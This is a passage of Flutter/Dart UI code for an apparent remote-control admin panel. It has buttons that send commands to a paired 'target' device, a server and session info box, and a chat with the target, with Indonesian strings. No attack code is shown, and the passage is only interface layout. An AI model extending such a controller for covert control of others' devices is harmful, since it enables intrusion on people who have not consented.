            mainAxisSpacing: 12,
            childAspectRatio: 1.1,
          ),
          itemCount: _commands.length,
          itemBuilder: (_, i) => _buildCommandButton(_commands[i]),
        ),
      ],
    );
  }

  Widget _buildCommandButton(_Cmd cmd) {
    final enabled = _isConnected && !_isLoading;
    return GestureDetector(
      onTap: enabled ? () => _sendCommand(cmd) : null,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        decoration: BoxDecoration(
          color: _C.card,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: enabled
                ? cmd.color.withOpacity(0.5)
                : _C.border,
            width: 1.5,
          ),
          boxShadow: enabled
              ? [
                  BoxShadow(
                    color: cmd.color.withOpacity(0.15),
                    blurRadius: 15,
                    offset: const Offset(0, 4),
                  )
                ]
              : [],
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              width: 50, height: 50,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: cmd.color.withOpacity(enabled ? 0.12 : 0.05),
                border: Border.all(
                  color: cmd.color.withOpacity(enabled ? 0.5 : 0.2),
                  width: 1.5,
                ),
              ),
              child: Icon(cmd.icon,
                  color: enabled ? cmd.color : _C.textDim, size: 24),
            ),
            const SizedBox(height: 10),
            Text(
              cmd.label,
              style: TextStyle(
                color: enabled ? _C.text : _C.textDim,
                fontSize: 11,
                fontWeight: FontWeight.w900,
                letterSpacing: 1,
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ── Server Info ───────────────────────────────────────────────────────────
  Widget _buildServerInfo() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: _C.cardAlt,
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: _C.border),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              const Icon(Icons.dns_rounded, color: _C.blue, size: 14),
              const SizedBox(width: 8),
              const Text(
                'SERVER INFO',
                style: TextStyle(
                  color: _C.textSub, fontSize: 10,
                  fontWeight: FontWeight.w800, letterSpacing: 1.5,
                ),
              ),
            ],
          ),
          const SizedBox(height: 8),
          _infoRow('Host', _Server.baseUrl.replaceAll('http://', '')),
          _infoRow('Device', _deviceInfo.isEmpty ? '...' : _deviceInfo),
          _infoRow('Session', widget.sessionKey.length > 8
              ? widget.sessionKey.substring(0, 8) + '...'
              : widget.sessionKey),
          _infoRow('Status', _isConnected ? 'CONNECTED' : 'IDLE',
              valueColor: _isConnected ? _C.green : _C.textDim),
        ],
      ),
    );
  }

  Widget _infoRow(String label, String value, {Color? valueColor}) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 3),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          SizedBox(
            width: 70,
            child: Text(label,
                style: const TextStyle(color: _C.textDim, fontSize: 10)),
          ),
          Expanded(
            child: Text(
              value,
              style: TextStyle(
                color: valueColor ?? _C.textSub,
                fontSize: 10,
                fontWeight: FontWeight.w700,
              ),
              maxLines: 1,
              overflow: TextOverflow.ellipsis,
            ),
          ),
        ],
      ),
    );
  }

  // ── Chat Toggle ───────────────────────────────────────────────────────────
  Widget _buildChatToggle() {
    return GestureDetector(
      onTap: () {
        setState(() {
          _isChatOpen = !_isChatOpen;
          if (_isChatOpen) {
            _unreadCount = 0;
            _hasNewChatNotification = false;
          }
        });
        if (_isChatOpen) {
          _startChatPolling();
          _scrollChatToBottom();
        }
      },
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
        decoration: BoxDecoration(
          color: _C.card,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(
            color: _hasNewChatNotification
                ? _C.amber
                : _C.teal.withOpacity(0.4),
            width: _hasNewChatNotification ? 2 : 1.2,
          ),
          boxShadow: _hasNewChatNotification
              ? [BoxShadow(color: _C.amber.withOpacity(0.2), blurRadius: 15)]
              : [],
        ),
        child: Row(
          children: [
            Stack(
              clipBehavior: Clip.none,
              children: [
                Container(
                  width: 38, height: 38,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: _C.teal.withOpacity(0.12),
                    border: Border.all(color: _C.teal.withOpacity(0.4)),
                  ),
                  child: const Icon(Icons.chat_bubble_rounded,
                      color: _C.teal, size: 18),
                ),
                if (_unreadCount > 0)
                  Positioned(
                    right: -4, top: -4,
                    child: Container(
                      padding: const EdgeInsets.symmetric(
                          horizontal: 6, vertical: 2),
                      decoration: BoxDecoration(
                        color: _C.red,
                        borderRadius: BorderRadius.circular(10),
                        border: Border.all(color: _C.surface, width: 2),
                      ),
                      child: Text(
                        '$_unreadCount',
                        style: const TextStyle(
                          color: Colors.white, fontSize: 9,
                          fontWeight: FontWeight.w900,
                        ),
                      ),
                    ),
                  ),
              ],
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      const Text(
                        'CHAT TARGET',
                        style: TextStyle(
                          color: _C.text, fontSize: 12,
                          fontWeight: FontWeight.w900, letterSpacing: 1.2,
                        ),
                      ),
                      if (_hasNewChatNotification) ...[
                        const SizedBox(width: 8),
                        Container(
                          padding: const EdgeInsets.symmetric(
                              horizontal: 6, vertical: 2),
                          decoration: BoxDecoration(
                            color: _C.amber.withOpacity(0.15),
                            borderRadius: BorderRadius.circular(6),
                            border: Border.all(
                                color: _C.amber.withOpacity(0.5)),
                          ),
                          child: const Text(
                            'NEW',
                            style: TextStyle(
                              color: _C.amber, fontSize: 8,
                              fontWeight: FontWeight.w900, letterSpacing: 1,
                            ),
                          ),
                        ),
                      ],
                    ],
                  ),
                  const SizedBox(height: 3),
                  Text(
                    _hasNewChatNotification
                        ? 'Pesan baru dari target!'
                        : 'Kirim pesan ke target',
                    style: TextStyle(
                      color: _hasNewChatNotification ? _C.amber : _C.textSub,
                      fontSize: 10,
                      fontWeight: _hasNewChatNotification
                          ? FontWeight.w700
                          : FontWeight.w400,
                    ),
                  ),
                ],
              ),
            ),
            Icon(
              _isChatOpen
                  ? Icons.keyboard_arrow_down_rounded
                  : Icons.keyboard_arrow_up_rounded,
              color: _C.teal, size: 22,
            ),
          ],
        ),
      ),
    );
  }

  // ── Chat Panel ────────────────────────────────────────────────────────────
  Widget _buildChatPanel() {
    return Container(
      decoration: BoxDecoration(
        color: _C.surface,
        border: Border(
          top: BorderSide(color: _C.teal.withOpacity(0.4), width: 1.5),
        ),
        boxShadow: [
          BoxShadow(
            color: _C.text.withOpacity(0.1),
            blurRadius: 15,
            offset: const Offset(0, -4),
          )
        ],
      ),
      child: Column(
        children: [
          Padding(
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
            child: Row(
              children: [
                Container(
                  width: 8, height: 8,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle, color: _C.green,
                    boxShadow: [
                      BoxShadow(
                          color: _C.green.withOpacity(0.5), blurRadius: 6)
                    ],
                  ),
                ),
                const SizedBox(width: 8),
                const Text(
                  'LIVE CHAT',
                  style: TextStyle(
                    color: _C.teal, fontSize: 11,
                    fontWeight: FontWeight.w900, letterSpacing: 1.5,
                  ),
                ),
                const SizedBox(width: 8),
                Text(
                  '• $_pairedTarget',
                  style: const TextStyle(color: _C.textSub, fontSize: 10),
                ),
                const Spacer(),
                Text(
                  '${_chatMessages.length} pesan',
                  style: const TextStyle(color: _C.textDim, fontSize: 10),
                ),
                const SizedBox(width: 8),
                GestureDetector(
                  onTap: () => setState(() => _isChatOpen = false),
                  child: const Icon(Icons.close_rounded,
                      color: _C.textSub, size: 18),
                ),
              ],
            ),
          ),
          Container(height: 1, color: _C.border),
          Expanded(
            child: _chatMessages.isEmpty
                ? const Center(
                    child: Padding(
                      padding: EdgeInsets.all(20),
                      child: Column(
                        mainAxisSize: MainAxisSize.min,
                        children: [
                          Icon(Icons.chat_bubble_outline_rounded,
                              color: _C.textDim, size: 36),
                          SizedBox(height: 10),
                          Text(
                            'Belum ada pesan',
                            style: TextStyle(
                                color: _C.textDim, fontSize: 12),
                          ),
                          SizedBox(height: 4),
                          Text(
                            'Kirim pesan untuk memulai chat dengan target',
                            textAlign: TextAlign.center,
                            style: TextStyle(
                                color: _C.textDim, fontSize: 10),
                          ),
                        ],
                      ),
                    ),
                  )
                : ListView.builder(
                    controller: _chatScroll,
                    padding: const EdgeInsets.symmetric(
                        horizontal: 12, vertical: 10),
                    itemCount: _chatMessages.length,
                    itemBuilder: (_, i) {
                      final msg = _chatMessages[i];
                      final isAdmin = msg.sender == 'admin';
                      return Align(
                        alignment: isAdmin
                            ? Alignment.centerRight
                            : Alignment.centerLeft,
                        child: Container(
                          margin: const EdgeInsets.only(bottom: 8),
                          padding: const EdgeInsets.symmetric(
                              horizontal: 12, vertical: 8),
                          constraints: const BoxConstraints(maxWidth: 260),
                          decoration: BoxDecoration(
                            color: isAdmin
                                ? _C.teal.withOpacity(0.15)
                                : _C.cardAlt,
                            borderRadius: BorderRadius.only(
                              topLeft: const Radius.circular(12),
                              topRight: const Radius.circular(12),
                              bottomLeft:
                                  Radius.circular(isAdmin ? 12 : 2),
                              bottomRight:
                                  Radius.circular(isAdmin ? 2 : 12),
                            ),
                            border: Border.all(
                              color: isAdmin
                                  ? _C.teal.withOpacity(0.3)
                                  : _C.border,
                            ),
                          ),
                          child: Column(
                            crossAxisAlignment: isAdmin
                                ? CrossAxisAlignment.end
                                : CrossAxisAlignment.start,
                            children: [
                              Text(
                                msg.senderName,
                                style: TextStyle(
                                  color: isAdmin ? _C.teal : _C.amber,
                                  fontSize: 9,
                                  fontWeight: FontWeight.w800,
                                  letterSpacing: 0.5,
                                ),
                              ),
                              const SizedBox(height: 3),
                              Text(
                                msg.message,
                                style: const TextStyle(
                                  color: _C.text, fontSize: 12, height: 1.35,
                                ),
                              ),
                            ],
                          ),
                        ),
                      );
                    },
                  ),
          ),
          Container(
            padding: const EdgeInsets.fromLTRB(12, 8, 12, 12),
            decoration: BoxDecoration(
              border: Border(
                top: BorderSide(color: _C.border),
              ),
            ),
            child: Row(
              children: [
                Expanded(
                  child: TextField(
                    controller: _chatCtrl,
                    style: const TextStyle(color: _C.text, fontSize: 12),
                    cursorColor: _C.teal,
                    maxLines: 3,
                    minLines: 1,
                    textInputAction: TextInputAction.send,
                    onSubmitted: (_) => _sendAdminChat(),
                    decoration: InputDecoration(
                      hintText: 'Tulis pesan ke target...',
                      hintStyle: const TextStyle(
                          color: _C.textDim, fontSize: 11),
                      filled: true,
                      fillColor: _C.bg,
                      contentPadding: const EdgeInsets.symmetric(
                          horizontal: 14, vertical: 10),
                      enabledBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(20),
                        borderSide: BorderSide(color: _C.border),
                      ),
                      focusedBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(20),
                        borderSide: const BorderSide(
                            color: _C.teal, width: 1.5),
                      ),
                    ),
                  ),
                ),
                const SizedBox(width: 8),
                GestureDetector(
                  onTap: _sendAdminChat,
                  child: Container(
                    width: 44, height: 44,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      gradient: const LinearGradient(
                        colors: [_C.teal, _C.blue],
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                      ),
                      boxShadow: [
                        BoxShadow(
                          color: _C.teal.withOpacity(0.3), blurRadius: 12,
                        )
                      ],
                    ),
                    child: const Icon(Icons.send_rounded,
                        color: Colors.white, size: 18),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}